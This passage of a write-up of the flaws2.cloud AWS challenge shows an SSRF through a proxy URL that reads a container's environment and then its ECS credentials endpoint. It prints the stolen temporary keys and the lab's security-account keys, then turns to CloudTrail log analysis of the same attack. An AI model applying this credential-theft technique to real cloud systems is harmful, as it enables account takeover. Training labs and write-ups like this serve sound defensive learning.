            <span class="s2">"Networks"</span>:[<span class="o">{</span><span class="s2">"NetworkMode"</span>:<span class="s2">"awsvpc"</span>, <span class="s2">"IPv4Addresses"</span>:[<span class="s2">"172.31.60.122"</span><span class="o">]}]</span>,
            <span class="s2">"Health"</span>:<span class="o">{</span>
                <span class="s2">"status"</span>:<span class="s2">"UNHEALTHY"</span>,
                <span class="s2">"statusSince"</span>:<span class="s2">"2020-10-15T03:01:50.720417705Z"</span>,
                <span class="s2">"exitCode"</span>:-1,
                <span class="s2">"output"</span>:<span class="s2">"OCI runtime exec failed: exec failed: container_linux.go:349: starting container process caused "</span><span class="nb">exec</span>: <span class="se">\\</span><span class="s2">"exit 0</span><span class="se">\\</span><span class="s2">"</span>: executable file not found <span class="k">in</span> <span class="nv">$PATH</span><span class="s2">": unknown"</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">]</span>,
    <span class="s2">"Limits"</span>:<span class="o">{</span><span class="s2">"CPU"</span>:0.25, <span class="s2">"Memory"</span>:512<span class="o">}</span>,
    <span class="s2">"PullStartedAt"</span>:<span class="s2">"2020-10-15T03:00:39.500173195Z"</span>,
    <span class="s2">"PullStoppedAt"</span>:<span class="s2">"2020-10-15T03:00:46.409668199Z"</span>
<span class="o">}</span>

<span class="c"># there are actually 2 containers, the top one being Fargate’s Internal ECS Pause Container</span>

</pre></table></code></div></div><ol><li>creds for the Task’s IAM Role aren’t just sitting there in the metadata like for EC2.<ul><li>Containers running via ECS on AWS have their creds at <code class="language-plaintext highlighter-rouge">169.254.170.2/v2/credentials/GUID</code><li><p>where the GUID is found from an environment variable <code class="language-plaintext highlighter-rouge">AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code></p><li>With ECS Fargate, each container has an environment variable <code class="language-plaintext highlighter-rouge">$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code><li>which contains the URI to retrieve these, which has some randomness in it.<li><p>retrieving environment variables from linux’ “magic” proc filesystem, at /proc/self/environ</p><li>From inside a container, we could query the credentials using with the following command:<li><code class="language-plaintext highlighter-rouge">curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code></ul></ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>root@e247007162e8:/var/www/html# <span class="nb">cat</span> /proc/self/environ
<span class="c"># HOSTNAME=e247007162e8TERM=xtermOLDPWD=/LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/var/www/htmlSHLVL=1HOME=/root_=/bin/cat</span>

root@e247007162e8:/var/www/html# <span class="nb">cat</span> /proc/self/environ | <span class="nb">tr</span> “<span class="se">\0</span>00” “

http://container.target.flaws2.cloud/proxy/file:///proc/self/environ
<span class="c"># HOSTNAME=ip-172-31-60-122.ec2.internal</span>
<span class="c"># HOME=/root</span>
<span class="c"># AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/f39e12f6-f9aa-4a24-a46c-c6faf3071770</span>
<span class="c"># AWS_EXECUTION_ENV=AWS_ECS_FARGATE</span>
<span class="c"># AWS_DEFAULT_REGION=us-east-1</span>
<span class="c"># ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/fea89204-6362-4166-8382-a0b00bc75f4f</span>
<span class="c"># ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/fea89204-6362-4166-8382-a0b00bc75f4f</span>
<span class="c"># PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
<span class="c"># AWS_REGION=us-east-1</span>
<span class="c"># PWD=/</span>



http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/GUID
<span class="c"># {"code":"InvalidIdInRequest","message":"CredentialsV2Request: Credentials not found","HTTPErrorCode":400}</span>


http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/f39e12f6-f9aa-4a24-a46c-c6faf3071770
<span class="c"># {</span>
<span class="c">#     "RoleArn":"arn:aws:iam::653711331788:role/level3",</span>
<span class="c">#     "AccessKeyId":"ASIAZQNB3KHGC65V4W6M",</span>
<span class="c">#     "SecretAccessKey":"KGNtE8jM/RquOkzCzlVkbG1DEwSkAhHmGHsNYcdi",</span>
<span class="c">#     "Token":"IQoJb3JpZ2luX2VjEFIaCXVzLWVhc3QtMSJIMEYCIQCMuZj+m50efHqe0UhHbGvdcNjZ7n02hhiSU4QsPXNogQIhAL2lz7V8cvfrnDyaNtpbHlSfJSSI+utsoWIcnDWO/3sHKqIDCDsQAhoMNjUzNzExMzMxNzg4Igx5XPdNwsU3TkH7Jwkq/wKZkxSJ3IDwAxY+ID/Plqi/GpB94uarLhT2aSX05nO9R5D3wgYvgWz3GpPqHndxJh5WYlPgFxDXO/NkgQ7n0j18JIunwlZhZsv+lWwJ+xRQDMvFftyWoRXfX9W4il4FkGYHMYYcJOLhUak8HL3iK+e/2aXyHYzEjAYosJ1NZ8JtJc+N1isimx4YRockT7+OzTaVKxgQ3FPn5vwd3O+LY5bOby0sZ8FWmLSSk9cSl0yLNYCx9ZKtNboGzFGOR7s1TkcnoP/nKjz5h0BENj+HuuTD4bp54k+6S064g6qJp1kWOQoufbqiIhnWexH9Z0JHH7kp7Q1Beu/jiwxGGR6HCVZnx0QaCEphHB2VQ3YR/ciTmeajHzuRRQoZKw8Ge+x0BAAQor96kmI1nJSC5VFmA82y8IqeXZckOTniGvuT+g+i+NjrltVP6DcyNEA9Yk3XEjjULYT8AaVlfrxfIwF0goNkja6GzKEqk1cbmFbnq5ELG6lIa8vchmUjuv/1HihPDzCVlMOABjrqATzAiePLSs5IvHVyms++wnsbVaWjws0uM2KTADAN9FrIZy+CCsI069Y5xuipEyYLij7YUvEdW6pXQip/5198EFTNsj8qIughvPltA8ifHNYHmBjeo7qZkURDVzQTiMTDDKIMIqK+RgaVupnaI5DHoDTD4/+VXT4JJyjCESRPSVyCdx/+n45/Apxn4A7sVPYss8FDYu7DgzmYu6W84B0mE4n1VlT8yZyO56kZkBaIljssxfQwtXT6J0E+sj7fT6G7vFbTyaLlzxOmXSiZ2b9hWBNSDy8GcvtIlitEW5ByT53Y8M5oKBcIDcziCA==",</span>
<span class="c">#     "Expiration":"2021-01-27T08:04:05Z"</span>
<span class="c"># }</span>
</pre></table></code></div></div><ol><li>get the iam</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> flaws3
<span class="c"># {</span>
<span class="c">#     "UserId": "AROAJQMBDNUMIKLZKMF64:2742123a-ed28-4a62-b08b-8cc33d932f26",</span>
<span class="c">#     "Account": "653711331788",</span>
<span class="c">#     "Arn": "arn:aws:sts::653711331788:assumed-role/level3/2742123a-ed28-4a62-b08b-8cc33d932f26"</span>
<span class="c"># }</span>


<span class="c"># the role doesn’t have IAM permissions to query,</span>


aws s3 <span class="nb">ls</span> <span class="se">\</span>
    <span class="nt">--profile</span> flaws3
<span class="c"># 2018-11-20 14:50:08 flaws2.cloud</span>
<span class="c"># 2018-11-20 13:45:26 level1.flaws2.cloud</span>
<span class="c"># 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</span>
<span class="c"># 2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</span>
<span class="c"># 2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud</span>


http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/HhX2Vds.png" alt="Screen Shot 2021-01-26 at 23.06.38" /></p><hr /><h1 id="defender-track">Defender Track</h1><p>Welcome Defender! As an incident responder we’re granting you access to the AWS account called “Security” as an IAM user.</p><ul><li>This account contains a copy of the logs during the time period of the incident<li>and has the ability to assume into the “Security” role in the target account<li>so you can look around to spot the misconfigurations that allowed for this attack to happen.</ul><h2 id="credentials">Credentials</h2><p>Your IAM credentials to the Security account:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Login: https://flaws2-security.signin.aws.amazon.com/console
Account ID: 322079859186
Username: security
Password: password
Access Key: AKIAIUFNQ2WCOPTEITJQ
Secret Key: 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
</pre></table></code></div></div><h2 id="environment">Environment</h2><p>The credentials above</p><ul><li>give you access to the Security account, which can assume the role “security” in the Target account.<li>also have access to an S3 bucket, named flaws2_logs, in the Security account that, that contains the CloudTrail logs recorded during a successful compromise from the Attacker track.</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/fZhb1wZ.png" alt="defender_account" /></p><hr /><h2 id="objective-1-download-cloudtrail-logs">Objective 1: Download CloudTrail logs</h2><ol><li>Setup CLI</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c"># download the CloudTrail logs.</span>
<span class="c"># configuring the AWS CLI or try using aws-vault as it avoids storing the keys in plain-text in your home directory like the AWS CLI does, so it helps avoid a common source of key leakage.</span>

<span class="c"># Ensure this worked by running:</span>
aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> flawsd
<span class="c"># {</span>
<span class="c">#     "UserId": "AIDAJXZBU42TNFRNGBBFI",</span>
<span class="c">#     "Account": "322079859186",</span>
<span class="c">#     "Arn": "arn:aws:iam::322079859186:user/security"</span>
<span class="c"># }</span>


<span class="c"># list the buckets in the account (aws s3 ls), and you'll get back flaws2-logs.</span>
aws s3 <span class="nb">ls</span> <span class="se">\</span>
    <span class="nt">--profile</span> flawsd
<span class="c"># 2018-11-19 15:54:31 flaws2-logs</span>
</pre></table></code></div></div><ol><li>Download the logs</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c"># download the CloudTrail logs with:</span>
aws s3 <span class="nb">sync </span>s3://flaws2-logs <span class="nb">.</span> <span class="se">\</span>
    <span class="nt">--profile</span> flawsd

<span class="c"># get .json.gz files</span>
<span class="c"># path AWSLogs/653711331788/CloudTrail/us-east-1/2018/11/28/.</span>
<span class="c"># These are the CloudTrail logs for a successful hack.</span>

<span class="c"># This S3 bucket is public so that you can reference it from Athena later.</span>
</pre></table></code></div></div><hr /><h2 id="objective-2-access-the-target-account">Objective 2: Access the Target account</h2><p>A common best practice of AWS setup</p><ul><li>have a separate Security account that contains the CloudTrail logs from all other AWS accounts and also has some sort of access into the other accounts to check up on things.<li>For this objective<li>access the Target account through the IAM role that grants the Security account access.</ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="c"># ~/.aws/config</span>
<span class="o">[</span>profile security]
<span class="nv">region</span><span class="o">=</span>us-east-1
<span class="nv">output</span><span class="o">=</span>json

<span class="c"># add a profile for the target to that file:</span>
<span class="o">[</span>profile target_security]
<span class="nv">region</span><span class="o">=</span>us-east-1
<span class="nv">output</span><span class="o">=</span>json
source_profile <span class="o">=</span> security
role_arn <span class="o">=</span> arn:aws:iam::653711331788:role/security


<span class="c"># now run:</span>
<span class="c"># account ID is 322079859186, running in the security account,</span>
<span class="c"># when it is 653711331788, running in the context of the target account.</span>

aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> flawd
<span class="c"># {</span>
<span class="c">#     "UserId": "AIDAJXZBU42TNFRNGBBFI",</span>
<span class="c">#     "Account": "322079859186",</span>
<span class="c">#     "Arn": "arn:aws:iam::322079859186:user/security"</span>
<span class="c"># }</span>

aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> target_security
<span class="c"># {</span>
<span class="c">#     "UserId": "AROAIKRY5GULQLYOGRMNS:botocore-session-1611721710",</span>
<span class="c">#     "Account": "653711331788",</span>
<span class="c">#     "Arn": "arn:aws:sts::653711331788:assumed-role/security/botocore-session-1611721710"</span>
<span class="c"># }</span>


<span class="c"># the S3 buckets for the levels of the Attacker path.</span>
aws s3 <span class="nb">ls</span> <span class="se">\</span>
    <span class="nt">--profile</span> target_security
<span class="c"># 2018-11-20 14:50:08 flaws2.cloud</span>
<span class="c"># 2018-11-20 13:45:26 level1.flaws2.cloud</span>
<span class="c"># 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</span>
<span class="c"># 2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</span>
<span class="c"># 2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud</span>

</pre></table></code></div></div><hr /><h2 id="objective-3-use-jq">Objective 3: Use jq</h2><p>digging into the log data</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
</pre><td class="rouge-code"><pre><span class="c"># have jq installed</span>

<span class="c"># All the logs are in AWSLogs/653711331788/CloudTrail/us-east-1/2018/11/28/, but often you will have CloudTrail logs in lots of subdirectories, so it's helpful to be able to act on them all at once.</span>
<span class="c"># Assuming your current working directory is inside a folder where you downloaded these files, and you don't have anything else there, gunzip the files by running the following, which will find all the files in every subdirectory, recursively, and attempt to gunzip them.:</span>
<span class="nb">cd </span>AWSLogs/653711331788/CloudTrail/us-east-1/2018/11/28
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">gunzip</span> <span class="o">{}</span> <span class="se">\;</span>

<span class="c"># cat them through jq with:</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="s1">'.'</span>

<span class="c"># You should see nicely formatting json data</span>

<span class="c"># let's just see the event names. Replace the jq query in the command above to:</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="s1">'.Records[].eventName'</span>
<span class="c"># You should see:</span>
<span class="c"># ...</span>
<span class="c"># "GetObject"</span>
<span class="c"># "GetObject"</span>
<span class="c"># "GetObject"</span>
<span class="c"># "GetObject"</span>
<span class="c"># "ListBuckets"</span>
<span class="c"># "AssumeRole"</span>
<span class="c"># "AssumeRole"</span>

<span class="c"># These are slightly out of order, so let's include the time</span>
<span class="c"># The -cr prints the data in a row</span>
<span class="c"># the |@tsv makes this tab separated.</span>
<span class="c"># Then it gets sorted by the time since that's the first colunm.</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="nt">-cr</span> <span class="s1">'.Records[]|[.eventTime, .eventName]|@tsv'</span> | <span class="nb">sort</span>
<span class="c"># ...</span>
<span class="c"># 2018-11-28T23:06:33Z	GetDownloadUrlForLayer</span>
<span class="c"># 2018-11-28T23:07:08Z	GetObject</span>
<span class="c"># 2018-11-28T23:07:08Z	GetObject</span>
<span class="c"># 2018-11-28T23:09:28Z	ListBuckets</span>
<span class="c"># 2018-11-28T23:09:36Z	GetObject</span>
<span class="c"># 2018-11-28T23:09:36Z	GetObject</span>





<span class="c"># Extending that even further, we can replace the jq part with:</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="nt">-cr</span> <span class="s1">'.Records[]|[.eventTime, .sourceIPAddress, .userIdentity.arn, .userIdentity.accountId, .userIdentity.type, .eventName]|@tsv'</span> | <span class="nb">sort</span>



<span class="c"># then copy that into Excel or another spreadsheet which can sometimes make the data easier to work with.</span>
2018-11-28T22:31:59Z	ecs-tasks.amazonaws.com			AWSService	AssumeRole
2018-11-28T22:31:59Z	ecs-tasks.amazonaws.com			AWSService	AssumeRole
2018-11-28T23:02:56Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:02:56Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:02:56Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:02:56Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:02:57Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:11Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:11Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:12Z	34.234.236.212	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	CreateLogStream
2018-11-28T23:03:12Z	lambda.amazonaws.com			AWSService	AssumeRole
2018-11-28T23:03:13Z	34.234.236.212	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	CreateLogStream
2018-11-28T23:03:13Z	apigateway.amazonaws.com			AWSService	Invoke
2018-11-28T23:03:14Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:17Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:18Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:03:20Z	34.234.236.212	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	CreateLogStream
2018-11-28T23:03:20Z	apigateway.amazonaws.com			AWSService	Invoke
2018-11-28T23:03:35Z	34.234.236.212	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	CreateLogStream
2018-11-28T23:03:50Z	34.234.236.212	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	CreateLogStream
2018-11-28T23:04:54Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	ListObjects
2018-11-28T23:05:10Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:05:12Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:05:12Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:05:53Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	ListImages
2018-11-28T23:06:17Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	BatchGetImage
2018-11-28T23:06:33Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level1/level1	653711331788	AssumedRole	GetDownloadUrlForLayer
2018-11-28T23:07:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:07:08Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:09:28Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level3/d190d14a-2404-45d6-9113-4eda22d7f2c7	653711331788	AssumedRole	ListBuckets
2018-11-28T23:09:36Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject
2018-11-28T23:09:36Z	104.102.221.250		ANONYMOUS_PRINCIPAL	AWSAccount	GetObject

<span class="c"># These logs mostly contain the attack,</span>
<span class="c"># but you'll notice also logs for "AWSService" events as the Lambda and ECS resources obtained their roles.</span>
<span class="c"># These are logs basically about how AWS works, and not any actions anyone did.</span>
<span class="c"># There are also a lot of ANONYMOUS_PRINCIPAL, which are calls that did not involve an AWS principal. In this case, these are S3 requests from a web browser.</span>
<span class="c"># If you look at the user-agent data (.userAgent) you'll see them as Chrome, as opposed to the AWS CLI.</span>
</pre></table></code></div></div><hr /><h2 id="objective-4-identify-credential-theft">Objective 4: Identify credential theft</h2><p>focusing in on the ListBuckets call which can be found by using the jq query:</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre>
<span class="c"># 23:09:28Z	104.102.221.250	arn:aws:sts::653711331788:assumed-role/level3/d190d14a-2404-45d6-9113-4eda22d7f2c7	653711331788	AssumedRole	ListBuckets</span>

<span class="c"># Let's work our way backward through the hack by first</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="s1">'.Records[]|select(.eventName=="ListBuckets")'</span>
<span class="c"># {</span>
<span class="c">#     "eventVersion": "1.05",</span>
<span class="c">#     "userIdentity": {</span>
<span class="c">#         "type": "AssumedRole",</span>
<span class="c">#         "principalId": "AROAJQMBDNUMIKLZKMF64:d190d14a-2404-45d6-9113-4eda22d7f2c7",</span>
<span class="c">#         "arn": "arn:aws:sts::653711331788:assumed-role/level3/d190d14a-2404-45d6-9113-4eda22d7f2c7",</span>
<span class="c">#         "accountId": "653711331788",</span>
<span class="c">#         "accessKeyId": "ASIAZQNB3KHGNXWXBSJS",</span>
<span class="c">#         "sessionContext": {</span>
<span class="c">#         "attributes": {</span>
<span class="c">#             "mfaAuthenticated": "false",</span>
<span class="c">#             "creationDate": "2018-11-28T22:31:59Z"</span>
<span class="c">#         },</span>
<span class="c">#         "sessionIssuer": {</span>
<span class="c">#             "type": "Role",</span>
<span class="c">#             "principalId": "AROAJQMBDNUMIKLZKMF64",</span>
<span class="c">#             "arn": "arn:aws:iam::653711331788:role/level3",</span>
<span class="c">#             "accountId": "653711331788",</span>
<span class="c">#             "userName": "level3"</span>
<span class="c">#         }</span>
<span class="c">#         }</span>
<span class="c">#     },</span>
<span class="c">#     "eventTime": "2018-11-28T23:09:28Z",</span>
<span class="c">#     "eventSource": "s3.amazonaws.com",</span>
<span class="c">#     "eventName": "ListBuckets",</span>
<span class="c">#     "awsRegion": "us-east-1",</span>
<span class="c">#     "sourceIPAddress": "104.102.221.250",</span>
<span class="c">#     "userAgent": "[aws-cli/1.16.19 Python/2.7.10 Darwin/17.7.0 botocore/1.12.9]",</span>
<span class="c">#     "requestParameters": null,</span>
<span class="c">#     "responseElements": null,</span>
<span class="c">#     "requestID": "4698593B9338B27F",</span>
<span class="c">#     "eventID": "65e111a0-83ae-4ba8-9673-16291a804873",</span>
<span class="c">#     "eventType": "AwsApiCall",</span>
<span class="c">#     "recipientAccountId": "653711331788"</span>
<span class="c"># }</span>


<span class="c"># the IP here is 104.102.221.250 which is not an Amazon owned IP, We'll view this IP as the attacker's IP.</span>


<span class="c"># This call came from the role level3, so let's look at that:</span>
aws iam get-role <span class="se">\</span>
    <span class="nt">--role-name</span> level3 <span class="se">\</span>
    <span class="nt">--profile</span> target_security
<span class="c"># {</span>
<span class="c">#     "Role": {</span>
<span class="c">#         "Description": "Allows ECS tasks to call AWS services on your behalf.",</span>
<span class="c">#         "AssumeRolePolicyDocument": {</span>
<span class="c">#             "Version": "2012-10-17",</span>
<span class="c">#             "Statement": [</span>
<span class="c">#                 {</span>
<span class="c">#                     "Action": "sts:AssumeRole",</span>
<span class="c">#                     "Principal": { "Service": "ecs-tasks.amazonaws.com" },</span>
<span class="c">#                     "Effect": "Allow",</span>
<span class="c">#                     "Sid": ""</span>
<span class="c">#                 }</span>
<span class="c">#             ]</span>
<span class="c">#         },</span>
<span class="c">#         "MaxSessionDuration": 3600,</span>
<span class="c">#         "RoleId": "AROAJQMBDNUMIKLZKMF64",</span>
<span class="c">#         "CreateDate": "2018-11-23T17:55:27Z",</span>
<span class="c">#         "RoleName": "level3",</span>
<span class="c">#         "Path": "/",</span>
<span class="c">#         "Arn": "arn:aws:iam::653711331788:role/level3"</span>
<span class="c">#     }</span>
<span class="c"># }</span>
<span class="c"># this role is only supposed to be run by the ECS service, as the AssumeRolePolicyDocument is only allowing that Principal,</span>
<span class="c"># but we just saw this IP clearly did not come from the AWS IP space</span>



<span class="c"># We don't have logs from the webserver that is running the ECS container</span>
<span class="c"># but we can assume from this one log event that it must have been hacked.</span>
<span class="c"># Normally, you'd see the resource (the ECS in this case) having made AWS API calls from it's own IP that you could then compare against any new IPs it may have made.</span>
<span class="c"># Using this concept is explained by Will Bengston in his talk Detecting Credential Compromise in AWS.</span>
</pre></table></code></div></div><hr /><h2 id="objective-5-identify-the-public-resource">Objective 5: Identify the public resource</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
